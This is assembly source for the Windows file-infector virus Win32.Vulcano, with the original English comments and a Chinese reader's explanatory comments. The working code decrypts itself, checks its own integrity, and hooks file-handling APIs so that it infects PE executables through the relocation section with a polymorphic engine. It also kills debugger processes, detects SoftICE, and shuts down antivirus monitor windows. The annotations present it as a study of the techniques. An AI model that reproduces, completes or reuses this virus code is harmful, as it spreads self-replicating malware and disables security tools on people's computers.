
```asm
    compressed:                                   ;compressed body starts here
    ;; 建立一个异常处理函数,指向 jmp_host.其后会进行分析
    ;; 建立后调用 call gdlta.到 gdlta 中进行分析...(同志们翻页了)
        @SEH_SetupFrame <jmp jmp_host>    ;setup SEH frame
        call gdlta                       ;calculate delta offset
;; 以下是病毒所用的一些地址记录。这里记录的都是到 gdelta 的一个偏移
;; 病毒所需 API 的地址
gdelta:  dd  ddFindFirstFileA-gdelta    ;addresses
  dd  ddFindNextFileA-gdelta    ;of variables
  dd  ddFindClose-gdelta    ;where will
  dd  ddSetFileAttributesA-gdelta  ;be stored
  dd  ddSetFileTime-gdelta    ;addresses of APIs
  dd  ddCreateFileA-gdelta
  dd  ddCreateFileMappingA-gdelta
  dd  ddMapViewOfFile-gdelta
  dd  ddUnmapViewOfFile-gdelta
  dd  ddCreateThread-gdelta
  dd  ddWaitForSingleObject-gdelta
  dd  ddCloseHandle-gdelta
  dd  ddCreateMutexA-gdelta
  dd  ddReleaseMutex-gdelta
  dd  ddOpenMutexA-gdelta
  dd  ddSleep-gdelta
  dd  ddVirtualProtect-gdelta
  dd  ddGetCurrentProcessId-gdelta
  dd  ddOpenProcess-gdelta
  dd  ddTerminateProcess-gdelta
  dd  ddLoadLibraryA-gdelta
  dd  ddGetProcAddress-gdelta
  dd  ddFreeLibrary-gdelta
  dd  ?        ;end of record
;; Hook 函数的地址
newHookers:
  dd  newFindFirstFileA-gdelta  ;addresses of API hookers
  dd  newFindNextFileA-gdelta
  dd  newCopyFileA-gdelta
  dd  newCopyFileExA-gdelta
  dd  newCreateFileA-gdelta
  dd  newCreateProcessA-gdelta
  dd  newDeleteFileA-gdelta
  dd  newGetFileAttributesA-gdelta
  dd  newGetFullPathNameA-gdelta
  dd  new_llopen-gdelta
  dd  newMoveFileA-gdelta
  dd  newMoveFileExA-gdelta
  dd  newOpenFile-gdelta
  dd  newSetFileAttributesA-gdelta
  dd  newWinExec-gdelta
  dd  newExitProcess-gdelta
  dd  newExitThread-gdelta
  dd  newGetLastError-gdelta
  dd  newCloseHandle-gdelta
  dd  ?        ;end of record

;; 被 Hook 的 API 原来的地址
oldHookers:
  dd  oldFindFirstFileA-gdelta  ;addresses, where will be
  dd  oldFindNextFileA-gdelta    ;stored original
  dd  oldCopyFileA-gdelta    ;API callers
  dd  oldCopyFileExA-gdelta
  dd  oldCreateFileA-gdelta
  dd  oldCreateProcessA-gdelta
  dd  oldDeleteFileA-gdelta
  dd  oldGetFileAttributesA-gdelta
  dd  oldGetFullPathNameA-gdelta
  dd  old_llopen-gdelta
  dd  oldMoveFileA-gdelta
  dd  oldMoveFileExA-gdelta
  dd  oldOpenFile-gdelta
  dd  oldSetFileAttributesA-gdelta
  dd  oldWinExec-gdelta
  dd  oldExitProcess-gdelta
  dd  oldExitThread-gdelta
  dd  oldGetLastError-gdelta
  dd  oldCloseHandle-gdelta

;; 这里就是病毒真正要开始的地方
;; 第一条语句将 gdelta 的地址放入 ebp 中
gdlta:  pop ebp          ;get delta offset
  ;; 首先解密第 2 层加密的地方,异或 1,长度为(virus_end-encrypted+3)/4
  ;; 这里使用了一个小技巧来对抗仿真换了一下选择子
  lea esi, [ebp + encrypted - gdelta]  ;get start of encrypted code
  mov ecx, (virus_end-encrypted+3)/4  ;number of dwords to encrypt
  push es          ;save selector
  push ds
  pop es          ;ES=DS
decrypt:lodsd          ;load dword
  xor eax, 1        ;decrypt it
  mov es:[esi-4], eax      ;save dword with AntiAV (usage of
  loop decrypt        ;selectors)

;; 第 2 层加密的地方
encrypted:          ;encrypted code starts here
  pop es          ;restore selector
  ;; crc32prot 这里是被 CRC 保护的位置,病毒在这里进行校验
  lea esi, [ebp + crc32prot - gdelta]  ;start of CRC32 protected code
  mov edi, virus_end-crc32prot    ;size of that
  call CRC32        ;calculate CRC32
  cmp eax, 05BB5B647h      ;check for consistency

;; 被 CRC32 保护的位置
crc32prot:
  ;; 如果校验值不一样则跳入到 jmp_host 中
  jne jmp_host    ;jump to host if breakpoints set and such
  ;; 检查是否是 Pentium 系列的主机
  ;Pentium+ check
  pushad
        pushfd                              ;save EFLAGS
        pop eax                              ;get them
        mov ecx, eax                        ;save them
        or eax, 200000h                     ;flip ID bit in EFLAGS
        push eax                            ;store
        popfd                               ;flags
        pushfd                              ;get them back
        pop eax                             ;...
        xor eax, ecx                        ;same?
        je end_cc                           ;shit, we r on 486-
        xor eax, eax                        ;EAX=0
        inc eax                             ;EAX=1
        cpuid                               ;CPUID
        and eax, 111100000000b             ;mask processor family
        cmp ah, 4                           ;is it 486?
        je end_cc                           ;baaaaaaad
  popad
   
  ;; 以下这段代码可以 ANTI 老版本的 NodICE(比 99 年还老)
  ;; 对于现在???
  mov eax, ds        ;this will fuck
  push eax        ;some old versions
  pop ds          ;of NodICE
  mov ebx, ds
  xor eax, ebx
  jne jmp_host
   
  ;; 获取所需的 API 地址
  ;; 这里取了一些通常的 Kernel32.dll 的 ImageBase
  ;; 调用 get_base 验证 ImageBase 的值
  mov eax, 77F00000h      ;WinNT 4.0 k32 image base
  call get_base
  jecxz k32_found        ;we got image base
  mov eax, 77E00000h      ;Win2k k32 image base
  call get_base
  jecxz k32_found        ;we got image base
  mov eax, 77ED0000h      ;Win2k k32 image base
  call get_base
  jecxz k32_found        ;we got image base
  mov eax, 0BFF70000h      ;Win95/98 k32 image base
  call get_base
  test ecx, ecx
  jne jmp_host        ;base of k32 not found, quit
   
  ;; 返回到 k32_found 标签
  ;; 利用 ret 跳入,对抗反汇编器
  push cs
  lea ebx, [ebp + k32_found - gdelta]  ;continue on another label
  push ebx
  retf          ;fuck u emulator! :)
;; 出错处理,弹出所有保存的寄存器,并
;; 跳入到 jmp_host 标签执行
end_cc:  popad          ;restore all registers
  jmp jmp_host        ;and jump to host

  db  'Win32.Vulcano by Benny/29A'  ;little signature :)

;; 获取到 kernel32.dll 的句柄后遍历从 kernel32.dll 的引出表
;; 取得所需 API 的地址.取地址的时候.API 的名字是用 CRC32 的值
;; 进行校验的,这里利用了堆栈的一些技巧。第一条语句获取了
;; 当前宿主程序的 ImageBase
k32_found:
  mov ebx, [esp.cPushad+8]    ;get image base of app
  ;; 将当前宿主程序的 ImageBase 写入到 GMHA 标签地址处
  mov [ebp + GMHA - gdelta], ebx    ;save it
  ;; ebx 指向当前程序的 PE 头
  add ebx, [ebx.MZ_lfanew]    ;get to PE header
  ;; esi 中存放的要取的 API 地址的字符串 CRC32 的值
  lea esi, [ebp + crcAPIs - gdelta]  ;start of CRC32 API table
  mov edx, ebp        ;get table of pointers
  ;; edi 指向到存放地址的偏移
s_ET:  mov edi, [edx]        ;get item
  ;; 如果判断时候到达最后一个存放的位置,如果为 0 则达到
  ;; 也表明取得所有 API 地址
  test edi, edi        ;is it 0?
  ;; 搜索完毕后跳入 end_ET 标签.
  je end_ET        ;yeah, work is done
  ;; edi 中为存放的偏移,ebp 为当前的 EIP,相加
  ;; edi 为存放偏移的空间地址
  add edi, ebp        ;normalize
  push eax        ;save EAX
  call SearchET        ;search for API
  stosd          ;save its address
  test eax, eax        ;was it 0?
  pop eax          ;restore EAX
  ;; 如果 SearchET 返回 eax = 0 则表明出错
  je jmp_host        ;yeah, error, quit
  ;; 如果为非 0 则 CRC32 表的指针移动,存放偏移表的指针移动
  add esi, 4        ;correct pointers
  add edx, 4        ;to pointers...
  jmp s_ET        ;loop
;; 确定是否是 kernel32.dll 的 ImageBase
;; 一个简单的判断,eax 中存放的为事先
;; 存入的 ImageBase 的值.然后利用判断
;; MZ 标志和 PE 标志来确定是否是正确的
;; PE 结构
get_base:
  pushad          ;save all registers
  ;; 安装异常处理,出错到 err_gbase 标号
  @SEH_SetupFrame <jmp err_gbase>    ;setup SEH frame
  xor ecx, ecx        ;set error value
  inc ecx
  cmp word ptr [eax], IMAGE_DOS_SIGNATURE  ;is it EXE?
  jne err_gbase        ;no, quit
  dec ecx          ;yeah, set flag
err_gbase:          ;and quit
  ;; 移除异常处理,ecx 中 1 为出错,0 为成功
  @SEH_RemoveFrame      ;remove SEH frame
  ;; 利用 pushad 返回到 ecx
  mov [esp.Pushad_ecx], ecx    ;save flag
  popad          ;restore all registers
  ret          ;and quit from procedure

;; 当获取完所有所需 API 的地址,流程将跳入此.
;; 这里主要的作用是开辟一条线程来进行当前宿主
;; 程序的引入表 HOOK
end_ET:  lea eax, [ebp + tmp - gdelta]    ;now we will create new
  push eax        ;thread to hide writing to
  xor eax, eax        ;Import table
  push eax
  ;; 将所用 API 地址的偏移表作为参数
  ;; 传递给新的线程
  push ebp        ;delta offset
  lea edx, [ebp + NewThread - gdelta]  ;address of thread procedure
  push edx
  push eax        ;and other shit to stack
  push eax
  mov eax, 0
;; 这里是一个很猥琐的技巧,可以在自己的代码中
;; 进行应用
ddCreateThread = dword ptr $-4
  call eax        ;create thread!
  test eax, eax        ;is EAX=0?
  ;; 开辟线程失败则退出
  je jmp_host        ;yeah, quit
  ;; 要入第一个 eax 是给 CloseHandle 传参数
  ;; 其后等待这个线程执行完毕
  push eax        ;parameter for CloseHandle
  push -1         ;infinite loop
  push eax        ;handle of thread
  call [ebp + ddWaitForSingleObject - gdelta]  ;wait for thread termination

  call [ebp + ddCloseHandle - gdelta]  ;close thread handle

;now we will create space in shared memory for VLCB structure
;; 创建一个 VLCB 结构在共享内存
  call @VLCB
  db  'VLCB',0      ;name of shared area
@VLCB:  push 2000h        ;size of area
  push 0
  push PAGE_READWRITE
  push 0
  ;; 创建一个交换文件的映射
  push -1         ;SWAP FILE!
  call [ebp + ddCreateFileMappingA - gdelta]  ;open area
  test eax, eax
  je jmp_host        ;quit if error

  xor edx, edx
  push edx
  push edx
  push edx
  push FILE_MAP_WRITE
  push eax
  call [ebp + ddMapViewOfFile - gdelta]  ;map view of file to address
  xchg eax, edi        ;space of virus
  test edi, edi
  ;; 如果映射出错则跳入 end_gd1 标签处
  je end_gd1        ;quit if error
  mov [ebp + vlcbBase - gdelta], edi  ;save base address

  ;now we will create named mutex
  ;; 创建一个互斥体,互斥名随机
  call @@@1        ;push address of name
@@1:  dd  0        ;random name
@@@1:  RDTCS          ;get random number
  mov edx, [esp]        ;get address of name
  shr eax, 8        ;terminate string with \0
  mov [edx], eax        ;and save it
  ;; esi 指向互斥体名
  mov esi, [esp]        ;get address of generated name
  push 0
  push 0
  mov eax, 0
ddCreateMutexA = dword ptr $-4
  call eax        ;create mutex
  test eax, eax
  ;; 创建失败则跳入 end_gd2
  je end_gd2        ;quit if error

;now we will initialize VLCB structure
;; 初始化 VLCB 结构
  xor edx, edx        ;EDX=0
  ;; edi 保存的 VLCB 共享内存
  mov eax, edi        ;get base of VLCB
  ;; VLCB 的标志
        mov [eax.VLCB_Signature], 'BCLV'  ;save signature

;now we will initialize record for thread
  ;; 20 个通信频道
  mov ecx, 20        ;20 communication channels
  ;; 检查当前记录结构是否被使用,如果被使用则进入下一个
sr_t:  cmp dword ptr [edi.VLCB_TSep.VLCB_THandle], 0  ;check handle
  jne tnext        ;if already reserved, then try next
  mov esi, [esi]        ;get name of mutex
  mov [edi.VLCB_TSep.VLCB_THandle], esi  ;save it
  ;; 互斥体的 ID 号
  mov [ebp + t_number - gdelta], edx  ;and save ID number of mutex
  ;; 创建线程,这里创建后则跳入到宿主中进行执行
  ;; 线程中进行等待当宿主程序执行到被 HOOK 的函数时
  ;; 通过对以上线程的操作来进行一下步操作
  lea eax, [ebp + tmp - gdelta]    ;create new thread
  push eax        ;for IPC
  xor eax, eax
  push eax
  push ebp
  lea edx, [ebp + mThread - gdelta]  ;address of thread procedure
  push edx
  push eax
  push eax
  call [ebp + ddCreateThread - gdelta]  ;create new thread
  xchg eax, ecx
  jecxz end_gd3        ;quit if error

;; 如果有任何错误则跳入到宿主程序中
jmp_host:
  ;移除 SEH 处理程序
  @SEH_RemoveFrame                        ;remove SEH frame
  mov eax, [esp.cPushad+4]    ;save address of previous
  mov [esp.Pushad_eax], eax    ;API caller
        popad                               ;restore all regs
  add esp, 8        ;repair stack pointer
  push cs          ;save selector
  push eax        ;save offset of API caller
  retf          ;jump to host :)
  ;; 下一个 VLCB 结构,移动 edi 指针
tnext:  add edi, VLCB_TSize      ;get to next record
  ;; 互斥体 ID 号自增
  inc edx          ;increment counter
  loop sr_t        ;try again
  jmp jmp_host        ;quit if more than 20 viruses r in memory
end_gd3:push esi
  call [ebp + ddCloseHandle - gdelta]  ;close mutex
end_gd2:push dword ptr [ebp + vlcbBase - gdelta]
  call [ebp + ddUnmapViewOfFile - gdelta]  ;unmap VLCB
end_gd1:push edi
  call [ebp + ddCloseHandle - gdelta]  ;close mapping of file
  jmp jmp_host        ;and jump to host


gtDelta:call mgdlta        ;procedure used to getting
;; 可以利用此方法的扩展随机产生单字节 opcode 去影响后面的指令
;; 从而达到 ANTI-反汇编的目的
;; mgdelta 标记和 ebp 在病毒后面用来定位地址
mgdelta:db  0b8h        ;fuck u disassemblers
mgdlta:  pop ebp          ;get it
  ;; 这里也进行了一个模糊的跳入,跳入之前压入堆栈的地址
  ret          ;and quit

;; 被 Hook 的函数们,被 HOOK 的函数大多都与文件操作有关
;; 这些函数被用来检查文件时候可以被感染,以及感染文件
newFindFirstFileA:        ;hooker for FindFirstFileA API
  push dword ptr [esp+8]      ;push parameters
  push dword ptr [esp+8]      ;...
  c_api oldFindFirstFileA      ;call original API

p_file:  pushad          ;store all registers
  call gtDelta        ;get delta
  mov ebx, [esp.cPushad+8]    ;get Win32 Find Data
  call Check&Infect      ;try to infect file
  popad          ;restore all registers
  ret 8          ;and quit

newFindNextFileA:
  push dword ptr [esp+8]      ;push parameters
  push dword ptr [esp+8]      ;...
  c_api oldFindNextFileA      ;call previous API
  jmp p_file        ;and continue

;; 这段函数对以下一些操作文件的 API 的支持
process_file:
  pushad          ;store all registers
  call gtDelta        ;get delta offset
  lea esi, [ebp + WFD2 - mgdelta]    ;get Win32_Find_Data
  push esi        ;save it
  push dword ptr [esp.cPushad+0ch]  ;push offset to filename
  call [ebp + ddFindFirstFileA - mgdelta]  ;find that file
  inc eax
  je end_pf        ;quit if error
  dec eax
  xchg eax, ecx        ;handle to ECX
  mov ebx, esi        ;WFD to EBX
  call Check&Infect      ;check and infect it
  push ecx
  call [ebp + ddFindClose - mgdelta]  ;close find handle
end_pf:  popad          ;restore all registers
  ret          ;and quit

;generic hookers for some APIs
newCopyFileExA:
  call process_file
  j_api oldCopyFileExA
newCopyFileA:
  call process_file
  j_api oldCopyFileA
newCreateFileA:
  call process_file
  j_api oldCreateFileA
newCreateProcessA:
  call process_file
  j_api oldCreateProcessA
newDeleteFileA:
  call process_file
  j_api oldDeleteFileA
newGetFileAttributesA:
  call process_file
  j_api oldGetFileAttributesA
newGetFullPathNameA:
  call process_file
  j_api oldGetFullPathNameA
new_llopen:
  call process_file
  j_api old_llopen
newMoveFileA:
  call process_file
  j_api oldMoveFileA
newMoveFileExA:
  call process_file
  j_api oldMoveFileExA
newOpenFile:
  call process_file
  j_api oldOpenFile
newSetFileAttributesA:
  call process_file
  j_api oldSetFileAttributesA
newWinExec:
  call process_file
  j_api oldWinExec

;; 打开一个设备驱动
open_driver:
        xor eax, eax                        ;EAX=0
        push eax                            ;parameters
        push 4000000h                       ;for
        push eax                            ;CreateFileA
        push eax                            ;API
        push eax                            ;function
        push eax                            ;...
  push ebx
        call [ebp + ddCreateFileA - mgdelta]    ;open driver
  ret

;; 关闭设备驱动
close_driver:
        push eax                            ;close its handle
        call [ebp + ddCloseHandle - mgdelta]
  ret

;; 检测调试器相关
common_stage:          ;infect files in curr. directory
  pushad
  call gtDelta        ;get delta offset

  mov ecx, fs:[20h]      ;get context debug
  jecxz n_debug        ;if zero, debug is not present

k_debug:mov eax, 0
ddGetCurrentProcessId = dword ptr $-4
  call eax        ;get ID number of current process
  call vlcb_stuph        ;common stuph
  lea esi, [ebp + data_buffer - mgdelta]
  mov dword ptr [esi.WFD_szAlternateFileName], ebp  ;set random data
  mov ebx, VLCB_Debug1      ;kill debugger
  call get_set_VLCB      ;IPC!

vlcb_stuph:
  xor edx, edx        ;random thread
  dec edx
  mov ecx, VLCB_SetWait      ;set and wait for result
  ret

n_debug:call vlcb_stuph        ;common stuph
  lea esi, [ebp + data_buffer - mgdelta]
  mov dword ptr [esi.WFD_szAlternateFileName], ebp  ;set random data
  mov ebx, VLCB_Debug2      ;check for SoftICE
  call get_set_VLCB      ;IPC!
  mov eax, dword ptr [esi.WFD_szAlternateFileName]  ;get result
  dec eax
  test eax, eax
  je endEP        ;quit if SoftICE in memory

  call vlcb_stuph        ;common stuph
  lea esi, [ebp + data_buffer - mgdelta]
  mov dword ptr [esi.WFD_szAlternateFileName], ebp  ;set random data
  mov ebx, VLCB_Monitor      ;kill monitors
  call get_set_VLCB      ;IPC!

  lea ebx, [ebp + WFD - mgdelta]    ;get Win32 Find Data
  push ebx        ;store its address
  call star
  db  '*.*',0        ;create mask
star:  mov eax, 0
ddFindFirstFileA = dword ptr $-4
  call eax        ;find file
  inc eax
  je endEP        ;if error, then quit
  dec eax
  mov [ebp + fHandle - mgdelta], eax  ;store handle
  call Check&Infect      ;and try to infect file

findF:  lea ebx, [ebp + WFD - mgdelta]    ;get Win32 Find Data
  push ebx        ;store address
  push_LARGE_0        ;store handle
fHandle = dword ptr $-4
  mov eax, 0
ddFindNextFileA = dword ptr $-4
  call eax        ;find next file
  xchg eax, ecx        ;result to ECX
  jecxz endEP2        ;no more files, quit
  call Check&Infect      ;try to infect file
  jmp findF        ;find another file

endEP2:  push dword ptr [ebp + fHandle - mgdelta];store handle
  mov eax, 0
ddFindClose = dword ptr $-4
  call eax        ;close it
endEP:  popad
  ret


;; 当程序退出时运行.检验调试器是否存在并且感染当前目录下文件
newExitProcess:          ;hooker for ExitProcess API
  pushad
  call common_stage      ;infect files in current directory
  call gtDelta        ;get delta offset
  mov edx, [ebp + t_number - mgdelta]  ;get ID number of thread
  push edx
  mov ecx, VLCB_SetWait      ;set and wait for result
  lea esi, [ebp + data_buffer - mgdelta]
  mov dword ptr [esi.WFD_szAlternateFileName], ebp
  mov ebx, VLCB_Quit      ;terminate thread
  call get_set_VLCB      ;IPC!

  pop edx          ;number of thread
  imul edx, VLCB_TSize      ;now we will
  push VLCB_TSize/4      ;erase thread
  pop ecx          ;record
  add edi, edx        ;from VLCB
  add edi, VLCB_TSep
  xor eax, eax
  rep stosd        ;...
  popad
  j_api oldExitProcess      ;jump to original API


;next hookers
newExitThread:
  call common_stage
  j_api oldExitThread
newCloseHandle:
  call common_stage
  j_api oldCloseHandle
newGetLastError:
  call common_stage
  j_api oldGetLastError

;; 反 AMON AVP monitor
;; 原理就是好寻找窗体,之后向窗体发送退出消息
Monitor:pushad          ;store all registers
  call szU32        ;push address of string USER32.dll
  db  'USER32',0
szU32:  mov eax, 0
ddLoadLibraryA = dword ptr $-4      ;Load USER32.dll
  call eax
  xchg eax, ebx
  test ebx, ebx
  je end_mon2        ;quit if error
  call FindWindowA      ;push address of string FindWindowA
  db  'FindWindowA',0
FindWindowA:
  push ebx        ;push lib handle
  mov eax, 0
ddGetProcAddress = dword ptr $-4    ;get address of FindWindowA API
  call eax
  xchg eax, esi
  test esi, esi
  je end_mon        ;quit if error
  call PostMessageA      ;push address of string PostMessageA
  db  'PostMessageA',0
PostMessageA:
  push ebx
  call [ebp + ddGetProcAddress - mgdelta]  ;get address of PostMessageA
  xchg eax, edi
  test edi, edi
  je end_mon        ;quit if error

  mov ecx, 3        ;number of monitors
  call Monitors        ;push address of strings
  db  'AVP Monitor',0      ;AVP monitor
  db  'Amon Antivirus Monitor',0  ;AMON english version
  db  'Antivusov?monitor Amon',0  ;AMON slovak version
Monitors:
  pop edx          ;pop address
k_mon:  pushad          ;store all registers
  xor ebp, ebp
  push edx
  push ebp
  call esi        ;find window
  test eax, eax
  je next_mon        ;quit if not found
  push ebp
  push ebp
  push 12h        ;WM_QUIT
  push eax
  call edi        ;destroy window
next_mon:
  popad          ;restore all registers
  push esi
  mov esi, edx
  @endsz          ;get to next string
  mov edx, esi        ;move it to EDX
  pop esi
  loop k_mon        ;try another monitor

end_mon:push ebx        ;push lib handle
  mov eax, 0
ddFreeLibrary = dword ptr $-4
  call eax        ;unload library
end_mon2:
  popad          ;restore all registers
  jmp d_wr        ;and quit


;; 这段代码用来实现检查在 95 与 NT 下的 softice
Debug2:  lea ebx, [ebp + sice95 - mgdelta]  ;address of softice driver string
  call open_driver      ;open driver
        inc eax                             ;is EAX==0?
        je n_sice                     ;yeah, SoftICE is not present
        dec eax
  call close_driver      ;close driver
  jmp d_wr        ;and quit
n_sice:  lea ebx, [ebp + siceNT - mgdelta]  ;address of softice driver string
  call open_driver      ;open driver
  inc eax
  je n2_db        ;quit if not present
  dec eax
  call close_driver      ;close driver
  jmp d_wr        ;and quit


;; 这段代码用来通过调试的进程 ID 来结束调试器的进程
Debug1:  push dword ptr [esi.WFD_szAlternateFileName]  ;push ID number of process
  push 0
  push 1
  mov eax, 0
ddOpenProcess = dword ptr $-4
  call eax        ;open process
  test eax, eax
  jne n1_db
n2_db:  call t_write        ;quit if error
  jmp m_thrd
n1_db:  push 0
  push eax
  mov eax, 0
ddTerminateProcess = dword ptr $-4    ;destroy debugged process :)
  call eax
  jmp t_write

;; 中断通讯的主要线程处理程序
;; 这个毒比较出彩的地方
mThread:pushad          ;main IPC thread
  @SEH_SetupFrame <jmp end_mThread>  ;setup SEH frame
  call gtDelta        ;get delta
;; 指向 call getDelta 后跳入到此进行真正的执行
;; m_thrd 是一个自修改的地方,用于确定自己的线程
;; ID 号
m_thrd:  mov edx, 0        ;get thread ID number
t_number = dword ptr $-4
  ;; ecx 中保存了等待信号
  mov ecx, VLCB_WaitGet
  ;; esi 中保存了一个临时缓冲的指针
  lea esi, [ebp + data_buffer - mgdelta]
  ;; 设置数据并等待
  call get_set_VLCB      ;wait for request
  ;; 如果等到请求则以此判断请求
  dec ecx
  ;; 退出
  jecxz Quit        ;quit
  dec ecx
  ;; 检查文件是否可以感染
  jecxz Check        ;check file
  cmp ecx, 1
  ;; 感染文件
  je Infect        ;check and infect file
  cmp ecx, 2
  ;; 检查调试器
  je Debug1        ;check for debugger
  ;; 检查调试器
  cmp ecx, 3
  je Debug2        ;check for SoftICE
  ;; 检查 AV monitors
  cmp ecx, 4
  je Monitor        ;kill AV monitors
   
  push 0
  call [ebp + ddSleep - mgdelta]    ;switch to next thread
  jmp m_thrd        ;and again...

Quit:  call t_write        ;write result
end_mThread:
  @SEH_RemoveFrame      ;remove SEH frame
  popad          ;restore all registers
  ret          ;and quit from thread
t_write:xor ecx, ecx        ;set result
  inc ecx
t_wr:  inc ecx
  mov dword ptr [esi.WFD_szAlternateFileName], ecx  ;write it
  mov ecx, VLCB_SetWait      ;set and wait
  mov edx, [ebp + t_number - mgdelta]  ;this thread
  call get_set_VLCB      ;IPC!
  ret
Check:  @SEH_SetupFrame <jmp err_sCheck>  ;setup SEH frame
  call CheckFile        ;check file
  jecxz err_sCheck      ;quit if error
_c1_ok:  @SEH_RemoveFrame      ;remove SEH frame
  call t_write        ;write result
  jmp m_thrd        ;and quit
err_sCheck:
  @SEH_RemoveFrame      ;remove SEH frame
d_wr:  xor ecx, ecx
  call t_wr        ;write result
  jmp m_thrd        ;and quit

;; 感染算法
Infect:  @SEH_SetupFrame <jmp _c1_ok>    ;setup SEH frame
  call InfectFile        ;check and infect file
  jmp _c1_ok        ;and quit

InfectFile:
  lea esi, [esi.WFD_szFileName]    ;get filename
  pushad
  xor eax, eax
  push eax
  push FILE_ATTRIBUTE_NORMAL
  push OPEN_EXISTING
  push eax
  push eax
  push GENERIC_READ or GENERIC_WRITE
  push esi
  mov eax, 0
ddCreateFileA = dword ptr $-4
  call eax        ;open file
  inc eax
  je r_attr        ;quit if error
  dec eax
  mov [ebp + hFile - mgdelta], eax  ;save handle

  xor edx, edx
  push edx
  push edx
  push edx
  push PAGE_READWRITE
  push edx
  push eax
  mov eax, 0
ddCreateFileMappingA = dword ptr $-4
  call eax        ;create file mapping
  xchg eax, ecx
  jecxz endCreateMapping      ;quit if error
  mov [ebp + hMapFile - mgdelta], ecx  ;save handle

  xor edx, edx
  push edx
  push edx
  push edx
  push FILE_MAP_WRITE
  push ecx
  mov eax, 0
ddMapViewOfFile = dword ptr $-4
  call eax        ;map view of file
  xchg eax, ecx
  jecxz endMapFile      ;quit if error
  mov [ebp + lpFile - mgdelta], ecx  ;save base address
  jmp nOpen

;; 这里当感染完毕后做的一些事情
endMapFile:
  push_LARGE_0        ;store base address
lpFile = dword ptr $-4
  mov eax, 0
ddUnmapViewOfFile = dword ptr $-4
  call eax        ;unmap view of file

endCreateMapping:
  push_LARGE_0        ;store handle
hMapFile = dword ptr $-4
  call [ebp + ddCloseHandle - mgdelta]  ;close file mapping
   
  ;将修改时间重新写回
  lea eax, [ebp + data_buffer.WFD_ftLastWriteTime - mgdelta]
  push eax
  lea eax, [ebp + data_buffer.WFD_ftLastAccessTime - mgdelta]
  push eax
  lea eax, [ebp + data_buffer.WFD_ftCreationTime - mgdelta]
  push eax
  push dword ptr [ebp + hFile - mgdelta]
  mov eax, 0
ddSetFileTime = dword ptr $-4
  call eax        ;set back file time

  push_LARGE_0        ;store handle
hFile = dword ptr $-4
  call [ebp + ddCloseHandle - mgdelta]  ;close file
   
  ;将文件属性重新设置
r_attr:  push dword ptr [ebp + data_buffer - mgdelta]
  lea esi, [ebp + data_buffer.WFD_szFileName - mgdelta]
  push esi        ;filename
  call [ebp + ddSetFileAttributesA - mgdelta]  ;set back file attributes
  jmp c_error        ;and quit

;; 这里是感染的开始,ecx 保存的是宿主文件的在内存的映射地址-pMem
nOpen:  mov ebx, ecx
  cmp word ptr [ebx], IMAGE_DOS_SIGNATURE  ;must be MZ
  jne endMapFile
  mov esi, [ebx.MZ_lfanew]
  add esi, ebx
  lodsd
  cmp eax, IMAGE_NT_SIGNATURE    ;must be PE\0\0
  jne endMapFile
  cmp word ptr [esi.FH_Machine], IMAGE_FILE_MACHINE_I386  ;must be 386+
  jne endMapFile
  mov ax, [esi.FH_Characteristics]
  test ax, IMAGE_FILE_EXECUTABLE_IMAGE  ;must be executable
  je endMapFile
  test ax, IMAGE_FILE_DLL      ;mustnt be DLL
  jne endMapFile
  test ax, IMAGE_FILE_SYSTEM    ;mustnt be system file
  jne endMapFile
  mov al, byte ptr [esi.OH_Subsystem]
  test al, IMAGE_SUBSYSTEM_NATIVE    ;and mustnt be driver (thanx GriYo !)
  jne endMapFile
   
  ;; 最少是两个节,才感染
  movzx ecx, word ptr [esi.FH_NumberOfSections]  ;must be more than one section
  dec ecx
  test ecx, ecx
  je endMapFile
  imul eax, ecx, IMAGE_SIZEOF_SECTION_HEADER
  movzx edx, word ptr [esi.FH_SizeOfOptionalHeader]
  lea edi, [eax+edx+IMAGE_SIZEOF_FILE_HEADER]
  ;; edi 为当前最后一节的节表
  add edi, esi        ;get to section header

  ;; 如果没有重定义节则不感染
  lea edx, [esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress-4]
  mov eax, [edx]
  test eax, eax
  je endMapFile        ;quit if no relocs
  ;; 如果有重定位节则判断重定位节是不是处于最后一节,如果不是则退出
  mov ecx, [edi.SH_VirtualAddress]
  cmp ecx, eax
  jne endMapFile        ;is it .reloc section?
  ;; 如果重定位节处于最后一节,则判断它的文件对齐大小是否小于 1a00h
  ;; 大于等于则退出
  cmp [edi.SH_SizeOfRawData], 1a00h
  jb endMapFile        ;check if .reloc is big enough
   
  ;; 清除重定位表在数据目录的记录
  pushad
  xor eax, eax
  mov edi, edx
  stosd          ;erase .reloc records
  stosd
  popad

  ;; ebx 中存放的是 pMem
  mov eax, ebx        ;now we will try to
  xor ecx, ecx        ;patch
it_patch:
  pushad          ;one API call
  ;; 获取要打补丁函数的 CRC32 值
  mov edx, dword ptr [ebp + crcpAPIs + ecx*4 - mgdelta]  ;get CRC32
  test edx, edx
  jne c_patch
  popad
  jmp end_patch        ;quit if end of record
;; 开始设置模糊入口点 EPO
;; 因为 Vulcano 是写在重定位节上面,所以这里将重定位节的 RVA
;; 设置到一个要进行 HOOK 的函数上,这些函数存放在表 crcpAPIs
;; 中都是些应用程序经常使用的 API.
c_patch:push dword ptr [edi.SH_VirtualAddress]  ;patch address
  push edx        ;CRC32
  mov [ebp + r2rp - mgdelta], eax    ;infection stage
  call PatchIT        ;try to patch API call
  mov [esp.Pushad_edx], eax    ;save address
  test eax, eax
  ;; 只要有一个函数被补丁成功则跳出
  popad          ;此时 edx 为被补丁函数的地址
  jne end_patch        ;quit if we got address
  inc ecx
  jmp it_patch        ;API call not found, try another API

;; 完成了对重定位表的补丁,写入病毒到宿主
end_patch:
  ;; eax 新的函数的地址
  mov eax, edx
  mov edx, [esi.NT_OptionalHeader.OH_ImageBase-4]  ;get Image base
  ;; 再这里将被感染程序的 ImageBase 写入到初始化标签
  mov [ebp + compressed + (ImgBase-decompressed) - mgdelta], edx  ;save it
  lea edx, [ebp + compressed + (ddAPI-decompressed) - mgdelta]
  push dword ptr [edx]        ;store prev. API call
  mov [edx], eax          ;save new one
  pushad            ;store all registers
  lea esi, [ebp + compressed+(VulcanoInit-decompressed) - mgdelta]
  mov edi, [edi.SH_PointerToRawData]
  ;; 这里把原先宿主程序的重定位节进行覆盖,病毒替换了原先的重定位节
  add edi, ebx        ;where to write body
  ;; 这里是要变形的长度
  mov ecx, (decompressed-VulcanoInit+3)/4  ;size of virus body
  call BPE32        ;write morphed body to file!
  ;; eax 中为变形后的长度
  mov [esp.Pushad_eax], eax    ;save size
  popad
  pop dword ptr [edx]      ;restore API call
  ;; 修改节属性为可读可写可执行
